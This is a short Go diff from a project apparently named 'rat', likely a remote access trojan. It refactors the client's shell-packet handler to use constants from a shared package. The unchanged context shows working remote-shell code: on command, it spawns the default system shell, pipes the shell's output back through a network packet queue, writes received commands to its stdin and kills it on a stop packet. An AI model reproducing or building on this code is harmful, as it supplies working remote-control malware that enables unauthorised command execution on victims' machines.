@@ -6,8 +6,8 @@ import (
 	"io"
 	"os/exec"
 	"rat/client/shell"
-
-	"rat/client/network/header"
+	"rat/shared"
+	"rat/shared/network/header"
 )
 
 type ShellPacket struct {
@@ -31,7 +31,7 @@ func (packet *ShellPacket) Init() {
 
 func (packet ShellPacket) OnReceive() error {
 	switch packet.Action {
-	case StartShell:
+	case shared.StartShell:
 		current.process = exec.Command(shell.GetDefault())
 		current.stdin, _ = current.process.StdinPipe()
 		current.stdout, _ = current.process.StdoutPipe()
@@ -51,10 +51,10 @@ func (packet ShellPacket) OnReceive() error {
 				Queue <- &ShellPacket{Data: s}
 			}
 		}()
-	case StopShell:
+	case shared.StopShell:
 		current.process.Process.Kill()
 		current.process = nil
-	case WriteShell:
+	case shared.WriteShell:
 		current.stdin.Write([]byte(packet.Data + shell.LineEnd))
 	}
 
